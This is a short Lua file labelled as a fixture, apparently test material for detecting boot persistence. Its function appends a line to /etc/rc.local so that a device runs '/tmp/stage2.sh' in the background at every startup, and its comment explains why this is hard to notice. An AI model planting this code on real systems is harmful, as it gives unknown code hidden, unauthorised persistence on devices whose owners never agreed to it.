-- Fixture: a line appended to /etc/rc.local (749).
--
-- The boot runs whatever this file says, so a line appended to it is a line the
-- device will execute next time it starts: no update mechanism, no service
-- manager, and nothing in the running process to show where it came from.
local MARKER = "/tmp/stage2.sh"

local function install()
   local handle = io.open("/etc/rc.local", "a")
   if not handle then
      return false
   end
   handle:write(MARKER .. " &\n")
   handle:close()
   return true
end

return install
